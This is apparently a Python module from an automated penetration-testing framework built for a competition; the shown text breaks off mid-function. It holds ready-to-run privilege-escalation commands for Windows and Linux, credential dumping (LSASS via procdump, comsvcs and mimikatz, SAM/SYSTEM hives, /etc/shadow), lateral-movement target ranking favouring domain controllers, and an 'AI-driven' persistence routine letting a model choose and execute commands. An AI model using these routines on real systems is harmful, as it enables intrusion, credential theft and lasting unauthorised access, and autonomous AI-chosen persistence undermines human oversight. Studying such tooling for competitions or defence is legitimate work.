# internal_network/advanced_operations.py
"""
高级渗透操作模块

处理复杂渗透场景:
- 权限提升 (Privilege Escalation)
- 远程桌面登录 (RDP/WinRM)
- 远程文件传输 (File Transfer)
- 凭据转储 (Credential Dumping)
- 持久化 (Persistence)
- 域渗透 (Domain Penetration)

设计原则:
1. 每个操作都有完整的错误处理和回滚机制
2. 支持多种执行方式（工具失败自动切换备用方案）
3. 详细的日志记录供审计
"""

import os
import time
import json
import re
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum
from tool_framework import ToolRegistry


class OperationStatus(Enum):
    """操作状态"""
    SUCCESS = "success"
    FAILED = "failed"
    PARTIAL = "partial"
    TIMEOUT = "timeout"
    NEED_CREDENTIALS = "need_credentials"
    NEED_PRIVILEGE = "need_privilege"


@dataclass
class OperationResult:
    """操作结果"""
    status: OperationStatus
    message: str
    data: Dict[str, Any]
    next_steps: List[str]
    rollback_cmd: Optional[str] = None


class PrivilegeEscalation:
    """
    权限提升处理器

    支持场景:
    - Windows: Potato系列、服务配置错误、UAC绕过
    - Linux: 内核漏洞、SUID、Sudo配置错误
    """

    # Windows提权方法（按优先级排序）
    WINDOWS_METHODS = [
        {
            "name": "PrintSpoofer",
            "check": "whoami /priv",
            "exploit": "PrintSpoofer.exe -i -c cmd",
            "requirement": "SeImpersonatePrivilege",
            "confidence": 0.9
        },
        {
            "name": "JuicyPotato",
            "check": "whoami /priv",
            "exploit": "JuicyPotato.exe -t * -p cmd.exe -l 1337",
            "requirement": "SeImpersonatePrivilege",
            "confidence": 0.85
        },
        {
            "name": "RoguePotato",
            "check": "whoami /priv",
            "exploit": "RoguePotato.exe -r {lhost} -l 9999 -e cmd.exe",
            "requirement": "SeImpersonatePrivilege",
            "confidence": 0.8
        },
        {
            "name": "GodPotato",
            "check": "whoami /priv",
            "exploit": "GodPotato.exe -cmd \"cmd -c whoami\"",
            "requirement": "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege",
            "confidence": 0.85
        },
        {
            "name": "ServiceConfig",
            "check": "sc query",
            "exploit": "sc config {service} binPath= \"cmd /c {command}\"",
            "requirement": "Service modification rights",
            "confidence": 0.7
        },
        {
            "name": "UAC_Bypass",
            "check": "whoami /groups",
            "exploit": "cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d \"{command}\" /f && computerdefaults.exe",
            "requirement": "Medium integrity",
            "confidence": 0.6
        }
    ]

    # Linux提权方法
    LINUX_METHODS = [
        {
            "name": "KernelExploit",
            "check": "uname -a",
            "exploit": "Search for kernel exploits based on version",
            "confidence": 0.7
        },
        {
            "name": "SUID",
            "check": "find / -perm -4000 -type f 2>/dev/null",
            "exploit": "Execute SUID binaries",
            "confidence": 0.8
        },
        {
            "name": "Sudo",
            "check": "sudo -l",
            "exploit": "Abuse sudo misconfigurations",
            "confidence": 0.85
        },
        {
            "name": "SudoMySQL",
            "check": "sudo -l | grep mysql",
            "exploit": "sudo mysql -e '\\! /bin/sh'  OR  sudo mysql -e '\\! cat /root/flag*'",
            "confidence": 0.95
        },
        {
            "name": "SudoVim",
            "check": "sudo -l | grep vim",
            "exploit": "sudo vim -c ':!/bin/sh'",
            "confidence": 0.95
        },
        {
            "name": "SudoLess",
            "check": "sudo -l | grep less",
            "exploit": "sudo less /etc/passwd\\n!/bin/sh",
            "confidence": 0.95
        },
        {
            "name": "SudoNmap",
            "check": "sudo -l | grep nmap",
            "exploit": "sudo nmap --interactive\\n!sh",
            "confidence": 0.95
        },
        {
            "name": "SudoFind",
            "check": "sudo -l | grep find",
            "exploit": "sudo find / -exec /bin/sh \\;",
            "confidence": 0.95
        },
        {
            "name": "SudoPython",
            "check": "sudo -l | grep python",
            "exploit": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
            "confidence": 0.95
        },
        {
            "name": "SudoPerl",
            "check": "sudo -l | grep perl",
            "exploit": "sudo perl -e 'exec \"/bin/sh\";'",
            "confidence": 0.95
        },
        {
            "name": "SudoBash",
            "check": "sudo -l | grep -E 'bash|sh'",
            "exploit": "sudo -u root /bin/bash",
            "confidence": 0.95
        },
        {
            "name": "Cron",
            "check": "cat /etc/crontab; ls -la /etc/cron*",
            "exploit": "Writable cron scripts",
            "confidence": 0.75
        },
        {
            "name": "Capabilities",
            "check": "getcap -r / 2>/dev/null",
            "exploit": "Abuse file capabilities",
            "confidence": 0.8
        },
        {
            "name": "Docker",
            "check": "id | grep docker; ls /var/run/docker.sock",
            "exploit": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
            "confidence": 0.9
        },
        {
            "name": "LXC/LXD",
            "check": "id | grep lxd; lxc list",
            "exploit": "lxc exec privileged-container -- /bin/sh",
            "confidence": 0.9
        }
    ]

    @classmethod
    def check_privileges(cls, session: Dict) -> Dict:
        """检查当前权限"""
        host = session.get("host")
        shell_type = session.get("shell_type")

        # 执行权限检查命令
        if session.get("os", "").lower() == "windows":
            commands = {
                "whoami": "whoami",
                "privileges": "whoami /priv",
                "groups": "whoami /groups",
                "system_check": "net session 2>&1"
            }
        else:
            commands = {
                "whoami": "id",
                "sudo_check": "sudo -l 2>/dev/null",
                "suid_check": "find / -perm -4000 -type f 2>/dev/null | head -20"
            }

        results = {}
        for name, cmd in commands.items():
            result = cls._execute_command(session, cmd)
            results[name] = result

        # 分析结果
        analysis = cls._analyze_privileges(results, session.get("os", "linux"))

        return {
            "current_user": results.get("whoami", {}).get("output", ""),
            "is_admin": analysis.get("is_admin", False),
            "is_system": analysis.get("is_system", False),
            "available_methods": analysis.get("methods", []),
            "raw_results": results
        }

    @classmethod
    def attempt_escalation(cls, session: Dict, method: str) -> OperationResult:
        """尝试权限提升"""
        os_type = session.get("os", "linux").lower()
        methods = cls.WINDOWS_METHODS if os_type == "windows" else cls.LINUX_METHODS

        # 找到指定方法
        method_config = next((m for m in methods if m["name"] == method), None)
        if not method_config:
            return OperationResult(
                status=OperationStatus.FAILED,
                message=f"Unknown escalation method: {method}",
                data={},
                next_steps=["Check available methods with check_privileges"]
            )

        # 执行提权
        exploit_cmd = method_config["exploit"]
        result = cls._execute_command(session, exploit_cmd)

        if result.get("success"):
            return OperationResult(
                status=OperationStatus.SUCCESS,
                message=f"Privilege escalation successful using {method}",
                data={"new_shell": result.get("output", "")},
                next_steps=["Verify new privileges", "Dump credentials"]
            )
        else:
            return OperationResult(
                status=OperationStatus.FAILED,
                message=f"Escalation failed: {result.get('error', 'Unknown error')}",
                data=result,
                next_steps=["Try alternative method", "Check prerequisites"]
            )

    @classmethod
    def _execute_command(cls, session: Dict, command: str) -> Dict:
        """通过会话执行命令"""
        host = session.get("host")
        shell_type = session.get("shell_type")

        if shell_type == "meterpreter":
            # 通过Metasploit执行
            result = ToolRegistry.execute_cached(
                "metasploit",
                host,
                {"action": "execute", "command": command}
            )
        elif shell_type in ["shell", "ssh"]:
            # 通过SSH执行
            result = ToolRegistry.execute_cached(
                "impacket",
                host,
                {"script": "wmiexec", "command": command}
            )
        else:
            # 尝试通过impacket
            result = ToolRegistry.execute_cached(
                "impacket",
                host,
                {"script": "psexec", "command": command}
            )

        return result.get("result", {})

    @classmethod
    def _analyze_privileges(cls, results: Dict, os_type: str) -> Dict:
        """分析权限状态"""
        analysis = {
            "is_admin": False,
            "is_system": False,
            "methods": []
        }

        if os_type == "windows":
            priv_output = results.get("privileges", {}).get("output", "")
            whoami_output = results.get("whoami", {}).get("output", "")

            # 检查是否是SYSTEM
            if "NT AUTHORITY\\SYSTEM" in whoami_output:
                analysis["is_system"] = True
                analysis["is_admin"] = True

            # 检查是否是管理员
            if "Administrators" in whoami_output:
                analysis["is_admin"] = True

            # 检查可用提权方法
            if "SeImpersonatePrivilege" in priv_output:
                for method in cls.WINDOWS_METHODS:
                    if method["requirement"] == "SeImpersonatePrivilege":
                        analysis["methods"].append({
                            "name": method["name"],
                            "confidence": method["confidence"]
                        })

            if "Medium integrity" in results.get("groups", {}).get("output", ""):
                analysis["methods"].append({
                    "name": "UAC_Bypass",
                    "confidence": 0.6
                })

        else:  # Linux
            id_output = results.get("whoami", {}).get("output", "")
            sudo_output = results.get("sudo_check", {}).get("output", "")
            suid_output = results.get("suid_check", {}).get("output", "")

            if "uid=0" in id_output:
                analysis["is_admin"] = True
                analysis["is_system"] = True

            # 检查Sudo配置 - 检测特定提权路径
            if sudo_output:
                sudo_lower = sudo_output.lower()

                # 检测常见的sudo提权命令
                sudo_escapes = {
                    "mysql": "SudoMySQL",
                    "vim": "SudoVim",
                    "vi": "SudoVim",
                    "less": "SudoLess",
                    "more": "SudoLess",
                    "nmap": "SudoNmap",
                    "find": "SudoFind",
                    "python": "SudoPython",
                    "python3": "SudoPython",
                    "perl": "SudoPerl",
                    "bash": "SudoBash",
                    "sh": "SudoBash",
                    "zsh": "SudoBash",
                    "docker": "Docker",
                }

                for cmd, method_name in sudo_escapes.items():
                    if cmd in sudo_lower and ("(root)" in sudo_output or "nopasswd" in sudo_lower):
                        analysis["methods"].append({
                            "name": method_name,
                            "confidence": 0.95,
                            "command": cmd
                        })

                # 如果有任意sudo权限但没匹配到特定命令
                if "(root)" in sudo_output and not analysis["methods"]:
                    analysis["methods"].append({
                        "name": "Sudo",
                        "confidence": 0.85
                    })

            # 检查SUID
            if suid_output and len(suid_output.strip()) > 0:
                analysis["methods"].append({
                    "name": "SUID",
                    "confidence": 0.8
                })

        return analysis


class RemoteDesktopHandler:
    """
    远程桌面处理器

    支持:
    - RDP (Windows)
    - WinRM (Windows)
    - VNC (Cross-platform)
    - SSH X11 Forwarding (Linux)
    """

    # RDP工具优先级列表
    RDP_TOOLS = [
        {"name": "xfreerdp", "cmd": "xfreerdp", "check_args": "/version"},
        {"name": "rdesktop", "cmd": "rdesktop", "check_args": "-V"},
    ]

    @classmethod
    def _check_rdp_tool(cls) -> Optional[str]:
        """检查可用的RDP工具"""
        for tool in cls.RDP_TOOLS:
            try:
                import subprocess
                result = subprocess.run(
                    [tool["cmd"], tool["check_args"]],
                    capture_output=True,
                    timeout=5
                )
                if result.returncode == 0 or result.stdout:
                    return tool["cmd"]
            except (FileNotFoundError, subprocess.TimeoutExpired):
                continue
        return None

    @classmethod
    def connect_rdp(cls, target: str, credentials: Dict) -> OperationResult:
        """
        连接RDP - 完整实现

        功能:
        1. 检查RDP工具可用性
        2. 验证目标3389端口可达
        3. 构建连接命令
        4. 提供凭据验证能力
        """
        username = credentials.get("username")
        password = credentials.get("password")
        domain = credentials.get("domain", "")

        # Step 1: 检查工具可用性
        rdp_tool = cls._check_rdp_tool()
        if not rdp_tool:
            return OperationResult(
                status=OperationStatus.FAILED,
                message="RDP工具不可用，请安装xfreerdp或rdesktop",
                data={"available_tools": ["xfreerdp", "rdesktop"]},
                next_steps=["apt install freerdp2-x11", "apt install rdesktop"]
            )

        # Step 2: 验证端口可达性
        port_result = cls._check_rdp_port(target)
        if not port_result.get("reachable"):
            return OperationResult(
                status=OperationStatus.FAILED,
                message=f"RDP端口不可达: {port_result.get('error')}",
                data=port_result,
                next_steps=["检查防火墙规则", "确认目标IP正确"]
            )

        # Step 3: 构建连接命令
        if rdp_tool == "xfreerdp":
            cmd = cls._build_xfreerdp_cmd(target, username, password, domain)
        else:
            cmd = cls._build_rdesktop_cmd(target, username, password, domain)

        return OperationResult(
            status=OperationStatus.SUCCESS,
            message="RDP连接参数已准备，可执行连接",
            data={
                "command": cmd,
                "target": target,
                "username": username,
                "tool": rdp_tool,
                "port_check": port_result
            },
            next_steps=["在交互式会话中执行连接命令", "使用verify_rdp_credentials验证凭据"]
        )

    @classmethod
    def verify_rdp_credentials(cls, target: str, credentials: Dict) -> OperationResult:
        """
        验证RDP凭据有效性

        使用xfreerdp的/nosc盾模式验证，不建立完整连接
        """
        username = credentials.get("username")
        password = credentials.get("password")
        domain = credentials.get("domain", "")

        rdp_tool = cls._check_rdp_tool()
        if not rdp_tool:
            return OperationResult(
                status=OperationStatus.FAILED,
                message="需要xfreerdp工具验证凭据",
                data={},
                next_steps=["apt install freerdp2-x11"]
            )

        # xfreerdp验证模式 - 只验证凭据，不获取桌面
        if rdp_tool == "xfreerdp":
            # 使用/nosc盾模式，只验证认证
            verify_cmd = [
                "xfreerdp",
                f"/u:{username}",
                f"/p:{password}",
                f"/v:{target}",
                "/nosc",
                "/sec:nla",  # 使用NLA认证
                "/cert-ignore",  # 忽略证书警告
                "+auth-only",  # 仅认证模式（如果可用）
                "/timeout:10000"
            ]
            if domain:
                verify_cmd.insert(3, f"/d:{domain}")

            try:
                import subprocess
                result = subprocess.run(
                    verify_cmd,
                    capture_output=True,
                    timeout=30,
                    text=True
                )

                # 分析结果
                output = result.stdout + result.stderr

                # 成功认证的标志
                if result.returncode == 0 or "Authentication successful" in output:
                    return OperationResult(
                        status=OperationStatus.SUCCESS,
                        message=f"RDP凭据验证成功: {username}@{target}",
                        data={"valid": True, "username": username},
                        next_steps=["建立完整RDP连接"]
                    )

                # 失败标志
                failed_indicators = [
                    "Authentication failed",
                    "Access denied",
                    "Logon failure",
                    "wrong password",
                    "invalid credentials"
                ]
                if any(ind in output for ind in failed_indicators):
                    return OperationResult(
                        status=OperationStatus.FAILED,
                        message=f"RDP凭据无效: {username}@{target}",
                        data={"valid": False, "error": "凭据验证失败"},
                        next_steps=["尝试其他凭据", "检查账户状态"]
                    )

                # 未知结果
                return OperationResult(
                    status=OperationStatus.PARTIAL,
                    message="RDP凭据验证结果未知",
                    data={"output": output[:500], "returncode": result.returncode},
                    next_steps=["手动验证", "检查NLA设置"]
                )

            except subprocess.TimeoutExpired:
                return OperationResult(
                    status=OperationStatus.TIMEOUT,
                    message="RDP验证超时",
                    data={},
                    next_steps=["检查目标可达性", "增加超时时间"]
                )
            except Exception as e:
                return OperationResult(
                    status=OperationStatus.FAILED,
                    message=f"RDP验证异常: {str(e)}",
                    data={},
                    next_steps=["检查工具配置"]
                )

        # rdesktop备用方案 - 端口验证
        return cls._verify_rdp_port_based(target, credentials)

    @classmethod
    def _check_rdp_port(cls, target: str) -> Dict:
        """检查RDP端口(3389)可达性"""
        import socket
        result = {"reachable": False, "error": None}

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            code = sock.connect_ex((target, 3389))
            sock.close()

            if code == 0:
                result["reachable"] = True
            else:
                result["error"] = f"端口3389连接失败 (code={code})"
        except socket.timeout:
            result["error"] = "连接超时"
        except Exception as e:
            result["error"] = str(e)

        return result

    @classmethod
    def _verify_rdp_port_based(cls, target: str, credentials: Dict) -> OperationResult:
        """备用验证方案：基于端口检查"""
        port_result = cls._check_rdp_port(target)

        if port_result.get("reachable"):
            return OperationResult(
                status=OperationStatus.PARTIAL,
                message="RDP端口可达，建议使用xfreerdp完整验证",
                data={"port_reachable": True, "credentials": credentials},
                next_steps=["安装xfreerdp进行完整验证"]
            )
        else:
            return OperationResult(
                status=OperationStatus.FAILED,
                message=f"RDP端口不可达: {port_result.get('error')}",
                data=port_result,
                next_steps=[]
            )

    @classmethod
    def _build_xfreerdp_cmd(cls, target: str, username: str,
                            password: str, domain: str = "") -> str:
        """构建xfreerdp命令"""
        cmd_parts = [
            "xfreerdp",
            f"/u:{username}",
            f"/p:{password}",
            f"/v:{target}",
            "/dynamic-resolution",  # 动态分辨率
            "+clipboard",  # 启用剪贴板
            "/cert-ignore",  # 忽略证书
            "/drive:share,/tmp"  # 共享驱动器（可选）
        ]
        if domain:
            cmd_parts.insert(3, f"/d:{domain}")
        return " ".join(cmd_parts)

    @classmethod
    def _build_rdesktop_cmd(cls, target: str, username: str,
                            password: str, domain: str = "") -> str:
        """构建rdesktop命令"""
        cmd_parts = ["rdesktop", target]
        if username:
            cmd_parts.append(f"-u '{username}'")
        if password:
            cmd_parts.append(f"-p '{password}'")
        if domain:
            cmd_parts.append(f"-d '{domain}'")
        return " ".join(cmd_parts)

    @classmethod
    def connect_winrm(cls, target: str, credentials: Dict) -> OperationResult:
        """通过WinRM连接"""
        username = credentials.get("username")
        password = credentials.get("password")
        domain = credentials.get("domain", "")

        # 使用evil-winrm
        result = ToolRegistry.execute_cached(
            "impacket",  # 或专门的evil-winrm
            target,
            {
                "script": "wmiexec",
                "target": target,
                "username": username,
                "password": password,
                "domain": domain
            }
        )

        if result.get("result", {}).get("success"):
            return OperationResult(
                status=OperationStatus.SUCCESS,
                message="WinRM session established",
                data={"session": result.get("result", {})},
                next_steps=["Execute commands", "Transfer files"]
            )
        else:
            return OperationResult(
                status=OperationStatus.FAILED,
                message="WinRM connection failed",
                data=result,
                next_steps=["Check WinRM service", "Verify credentials"]
            )


class FileTransferHandler:
    """
    文件传输处理器

    支持:
    - SMB上传/下载
    - HTTP上传/下载
    - FTP传输
    - Base64编码传输（适用于受限环境）
    """

    @classmethod
    def upload_file(cls, local_path: str, remote_path: str,
                    session: Dict, method: str = "smb") -> OperationResult:
        """上传文件到目标"""

        if not os.path.exists(local_path):
            return OperationResult(
                status=OperationStatus.FAILED,
                message=f"Local file not found: {local_path}",
                data={},
                next_steps=["Check file path"]
            )

        host = session.get("host")
        credentials = session.get("credentials", {})

        if method == "smb":
            return cls._upload_via_smb(local_path, remote_path, host, credentials)
        elif method == "http":
            return cls._upload_via_http(local_path, remote_path, host)
        elif method == "base64":
            return cls._upload_via_base64(local_path, remote_path, session)
        else:
            return OperationResult(
                status=OperationStatus.FAILED,
                message=f"Unknown upload method: {method}",
                data={},
                next_steps=["Use smb, http, or base64"]
            )

    @classmethod
    def download_file(cls, remote_path: str, local_path: str,
                      session: Dict, method: str = "smb") -> OperationResult:
        """从目标下载文件"""
        host = session.get("host")
        credentials = session.get("credentials", {})

        if method == "smb":
            return cls._download_via_smb(remote_path, local_path, host, credentials)
        elif method == "http":
            return cls._download_via_http(remote_path, local_path, host)
        elif method == "base64":
            return cls._download_via_base64(remote_path, local_path, session)
        else:
            return OperationResult(
                status=OperationStatus.FAILED,
                message=f"Unknown download method: {method}",
                data={},
                next_steps=["Use smb, http, or base64"]
            )

    @classmethod
    def _upload_via_smb(cls, local_path: str, remote_path: str,
                        host: str, credentials: Dict) -> OperationResult:
        """通过SMB上传"""
        result = ToolRegistry.execute_cached(
            "impacket",
            host,
            {
                "script": "smbclient",
                "target": host,
                "username": credentials.get("username"),
                "password": credentials.get("password"),
                "domain": credentials.get("domain", ""),
                "command": f"put {local_path} {remote_path}"
            }
        )

        if result.get("result", {}).get("success"):
            return OperationResult(
                status=OperationStatus.SUCCESS,
                message=f"File uploaded via SMB: {local_path} -> {remote_path}",
                data=result.get("result", {}),
                next_steps=["Verify upload", "Execute file"]
            )
        return OperationResult(
            status=OperationStatus.FAILED,
            message="SMB upload failed",
            data=result,
            next_steps=["Check SMB share permissions", "Try alternative method"]
        )

    @classmethod
    def _upload_via_base64(cls, local_path: str, remote_path: str,
                           session: Dict) -> OperationResult:
        """通过Base64编码上传（适用于受限环境）"""
        try:
            with open(local_path, "rb") as f:
                content = f.read()

            # 分块编码（避免命令行长度限制）
            import base64
            encoded = base64.b64encode(content).decode()
            chunk_size = 8000
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

            commands = []
            for i, chunk in enumerate(chunks):
                if i == 0:
                    cmd = f'echo "{chunk}" > {remote_path}.b64'
                else:
                    cmd = f'echo "{chunk}" >> {remote_path}.b64'
                commands.append(cmd)

            # 解码命令
            decode_cmd = f"base64 -d {remote_path}.b64 > {remote_path}"
            commands.append(decode_cmd)
            commands.append(f"rm {remote_path}.b64")

            return OperationResult(
                status=OperationStatus.SUCCESS,
                message="Base64 upload commands prepared",
                data={"commands": commands, "chunks": len(chunks)},
                next_steps=["Execute commands in sequence"]
            )
        except Exception as e:
            return OperationResult(
                status=OperationStatus.FAILED,
                message=f"Base64 encoding failed: {str(e)}",
                data={},
                next_steps=["Check file size", "Try alternative method"]
            )

    @classmethod
    def _download_via_smb(cls, remote_path: str, local_path: str,
                          host: str, credentials: Dict) -> OperationResult:
        """通过SMB下载"""
        result = ToolRegistry.execute_cached(
            "impacket",
            host,
            {
                "script": "smbclient",
                "target": host,
                "username": credentials.get("username"),
                "password": credentials.get("password"),
                "command": f"get {remote_path} {local_path}"
            }
        )

        if result.get("result", {}).get("success"):
            return OperationResult(
                status=OperationStatus.SUCCESS,
                message=f"File downloaded: {remote_path} -> {local_path}",
                data={"local_path": local_path},
                next_steps=["Analyze file contents"]
            )
        return OperationResult(
            status=OperationStatus.FAILED,
            message="SMB download failed",
            data=result,
            next_steps=["Check file permissions", "Try alternative path"]
        )

    @classmethod
    def _upload_via_http(cls, local_path: str, remote_path: str,
                         host: str) -> OperationResult:
        """预留HTTP上传接口"""
        return OperationResult(
            status=OperationStatus.NEED_CREDENTIALS,
            message="HTTP upload requires web server setup",
            data={},
            next_steps=["Setup HTTP server", "Use alternative method"]
        )

    @classmethod
    def _download_via_http(cls, remote_path: str, local_path: str,
                           host: str) -> OperationResult:
        """预留HTTP下载接口"""
        return OperationResult(
            status=OperationStatus.NEED_CREDENTIALS,
            message="HTTP download requires accessible web server",
            data={},
            next_steps=["Check for web server", "Use alternative method"]
        )

    @classmethod
    def _download_via_base64(cls, remote_path: str, local_path: str,
                             session: Dict) -> OperationResult:
        """通过Base64下载"""
        # 执行base64编码命令
        result = PrivilegeEscalation._execute_command(
            session, f"base64 {remote_path}"
        )

        if result.get("success"):
            try:
                import base64
                encoded = result.get("output", "")
                content = base64.b64decode(encoded)

                with open(local_path, "wb") as f:
                    f.write(content)

                return OperationResult(
                    status=OperationStatus.SUCCESS,
                    message=f"File downloaded via base64: {remote_path}",
                    data={"local_path": local_path, "size": len(content)},
                    next_steps=["Analyze file contents"]
                )
            except Exception as e:
                return OperationResult(
                    status=OperationStatus.FAILED,
                    message=f"Base64 decode failed: {str(e)}",
                    data=result,
                    next_steps=["Check encoding", "Try alternative method"]
                )

        return OperationResult(
            status=OperationStatus.FAILED,
            message="Base64 encoding command failed",
            data=result,
            next_steps=["Check file existence", "Verify permissions"]
        )


class CredentialDumper:
    """
    凭据转储处理器

    支持:
    - LSASS dump (Windows)
    - SAM/SYSTEM dump (Windows)
    - Mimikatz (Windows)
    - /etc/shadow (Linux)
    - Browser credentials
    - SSH keys
    """

    @classmethod
    def dump_lsass(cls, session: Dict) -> OperationResult:
        """转储LSASS内存"""
        if session.get("os", "").lower() != "windows":
            return OperationResult(
                status=OperationStatus.FAILED,
                message="LSASS dump only works on Windows",
                data={},
                next_steps=["Use appropriate method for Linux"]
            )

        # 检查权限
        priv_check = PrivilegeEscalation.check_privileges(session)
        if not priv_check.get("is_admin"):
            return OperationResult(
                status=OperationStatus.NEED_PRIVILEGE,
                message="LSASS dump requires admin privileges",
                data=priv_check,
                next_steps=["Attempt privilege escalation first"]
            )

        # 尝试多种方法
        methods = [
            ("procdump", "procdump.exe -accepteula -ma lsass.exe lsass.dmp"),
            ("rundll32", "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\temp\\lsass.dmp full"),
            ("mimikatz", "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"")
        ]

        results = []
        for method_name, cmd in methods:
            result = PrivilegeEscalation._execute_command(session, cmd)
            results.append({
                "method": method_name,
                "success": result.get("success", False),
                "output": result.get("output", "")[:500]  # 截断输出
            })
            if result.get("success"):
                break

        successful = [r for r in results if r["success"]]
        if successful:
            return OperationResult(
                status=OperationStatus.SUCCESS,
                message="LSASS dump successful",
                data={"method": successful[0]["method"], "results": results},
                next_steps=["Parse credentials", "Use for lateral movement"]
            )

        return OperationResult(
            status=OperationStatus.FAILED,
            message="All LSASS dump methods failed",
            data={"attempts": results},
            next_steps=["Check AV/EDR", "Try alternative timing"]
        )

    @classmethod
    def dump_sam_system(cls, session: Dict) -> OperationResult:
        """转储SAM和SYSTEM"""
        # 检查权限
        priv_check = PrivilegeEscalation.check_privileges(session)
        if not priv_check.get("is_admin"):
            return OperationResult(
                status=OperationStatus.NEED_PRIVILEGE,
                message="SAM dump requires admin privileges",
                data=priv_check,
                next_steps=["Attempt privilege escalation first"]
            )

        # 使用reg save
        commands = [
            "reg save HKLM\\SAM C:\\temp\\sam.bak",
            "reg save HKLM\\SYSTEM C:\\temp\\system.bak"
        ]

        results = {}
        for cmd in commands:
            result = PrivilegeEscalation._execute_command(session, cmd)
            results[cmd] = result

        if all(r.get("success") for r in results.values()):
            return OperationResult(
                status=OperationStatus.SUCCESS,
                message="SAM and SYSTEM dumped successfully",
                data={"files": ["C:\\temp\\sam.bak", "C:\\temp\\system.bak"]},
                next_steps=["Download files", "Parse offline with secretsdump"]
            )

        return OperationResult(
            status=OperationStatus.PARTIAL,
            message="Partial SAM dump success",
            data=results,
            next_steps=["Check specific errors", "Try alternative paths"]
        )

    @classmethod
    def dump_linux_hashes(cls, session: Dict) -> OperationResult:
        """转储Linux密码哈希"""
        if session.get("os", "").lower() == "windows":
            return OperationResult(
                status=OperationStatus.FAILED,
                message="This method is for Linux only",
                data={},
                next_steps=["Use LSASS or SAM dump for Windows"]
            )

        # 检查是否是root
        priv_check = PrivilegeEscalation.check_privileges(session)
        if not priv_check.get("is_admin"):
            return OperationResult(
                status=OperationStatus.NEED_PRIVILEGE,
                message="/etc/shadow requires root access",
                data=priv_check,
                next_steps=["Attempt privilege escalation first"]
            )

        result = PrivilegeEscalation._execute_command(session, "cat /etc/shadow")

        if result.get("success"):
            hashes = []
            for line in result.get("output", "").split("\n"):
                if ":" in line and "$" in line:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        hashes.append({
                            "username": parts[0],
                            "hash": parts[1],
                            "type": cls._identify_hash_type(parts[1])
                        })

            return OperationResult(
                status=OperationStatus.SUCCESS,
                message=f"Found {len(hashes)} password hashes",
                data={"hashes": hashes},
                next_steps=["Crack hashes", "Use for lateral movement"]
            )

        return OperationResult(
            status=OperationStatus.FAILED,
            message="Failed to read /etc/shadow",
            data=result,
            next_steps=["Verify root access", "Check file permissions"]
        )

    @staticmethod
    def _identify_hash_type(hash_string: str) -> str:
        """识别哈希类型"""
        if hash_string.startswith("$6$"):
            return "SHA-512"
        elif hash_string.startswith("$5$"):
            return "SHA-256"
        elif hash_string.startswith("$1$"):
            return "MD5"
        elif hash_string.startswith("$2y$") or hash_string.startswith("$2a$"):
            return "bcrypt"
        elif hash_string.startswith("___"):
            return "DES"
        else:
            return "unknown"


class IntelligentPathSelector:
    """
    智能路径选择器

    根据当前状态和发现的信息，自动选择最优攻击路径
    """

    @classmethod
    def select_next_target(cls, state: Dict) -> Dict:
        """
        选择下一个攻击目标

        考虑因素:
        1. 目标价值（域控、数据库服务器等）
        2. 可达性（有凭据、有路径）
        3. 成功概率（基于历史攻击结果）
        4. 资源消耗（时间、工具可用性）
        """
        internal_hosts = state.get("internal_hosts", [])
        credentials = state.get("credentials", [])
        active_sessions = state.get("active_sessions", [])
        attack_history = state.get("attack_results", [])

        # 已攻陷的主机
        compromised = [s.get("host") for s in active_sessions]

        # 评分每个未攻陷主机
        candidates = []
        for host in internal_hosts:
            ip = host.get("ip", "")
            if ip in compromised:
                continue

            score = cls._calculate_target_score(host, credentials, attack_history)
            candidates.append({
                "ip": ip,
                "score": score,
                "reason": score["reason"],
                "recommended_method": score["method"]
            })

        # 按分数排序
        candidates.sort(key=lambda x: x["score"]["total"], reverse=True)

        return {
            "recommended_target": candidates[0] if candidates else None,
            "all_candidates": candidates[:5],
            "reasoning": cls._explain_selection(candidates)
        }

    @classmethod
    def _calculate_target_score(cls, host: Dict, credentials: List,
                                history: List) -> Dict:
        """计算目标评分"""
        score = {
            "total": 0,
            "value": 0,
            "accessibility": 0,
            "success_probability": 0,
            "reason": "",
            "method": ""
        }

        ports = host.get("ports", [])
        port_numbers = [p.get("port") for p in ports]

        # 价值评分
        if any(p in port_numbers for p in [88, 389, 636, 3268]):
            score["value"] = 100  # 域控
            score["reason"] = "Domain Controller"
            score["method"] = "Kerberos attack"
        elif any(p in port_numbers for p in [1433, 3306, 5432]):
            score["value"] = 80  # 数据库
            score["reason"] = "Database server"
            score["method"] = "Database attack"
        elif any(p in port_numbers for p in [445, 139]):
            score["value"] = 60  # 文件服务器
            score["reason"] = "SMB accessible"
            score["method"] = "SMB exploitation"
        elif 3389 in port_numbers:
            score["value"] = 50  # RDP
            score["reason"] = "RDP available"
            score["method"] = "RDP login"
        elif 22 in port_numbers:
            score["value"] = 40  # SSH
            score["reason"] = "SSH available"
            score["method"] = "SSH brute force"
        else:
            score["value"] = 20
            score["reason"] = "Generic target"
            score["method"] = "Service enumeration"

        # 可达性评分
        if credentials:
            score["accessibility"] = 50

        # 成功概率（基于历史）
        if history:
            recent_success = sum(1 for h in history[-10:] if h.get("is_exploit"))
            score["success_probability"] = recent_success * 5

        # 总分
        score["total"] = score["value"] + score["accessibility"] + score["success_probability"]

        return score

    @classmethod
    def _explain_selection(cls, candidates: List) -> str:
        """解释选择原因"""
        if not candidates:
            return "No targets available"

        best = candidates[0]
        return f"Selected {best['ip']} ({best['reason']}) with score {best['score']['total']}"


class PersistenceHandler:
    """
    AI驱动的持久化处理器

    设计原则:
    - 让AI分析环境并决定最佳策略
    - 不预定义方法列表，避免硬编码规则
    - 简洁有效，代码清晰

    比赛关键: 第三赛区多层网络需要权限维持
    """

    @classmethod
    def establish_persistence(cls, session: Dict) -> OperationResult:
        """
        AI驱动建立持久化访问

        流程:
        1. 收集环境信息
        2. AI分析并决定策略
        3. 执行AI建议的命令
        4. 验证持久化有效
        """
        # Step 1: 收集环境信息
        env_info = cls._collect_env_info(session)
        os_type = session.get("os_type", "linux").lower()

        # Step 2: AI分析并决定策略
        ai_decision = cls._ai_decide_persistence(os_type, env_info)

        if not ai_decision.get("commands"):
            return OperationResult(
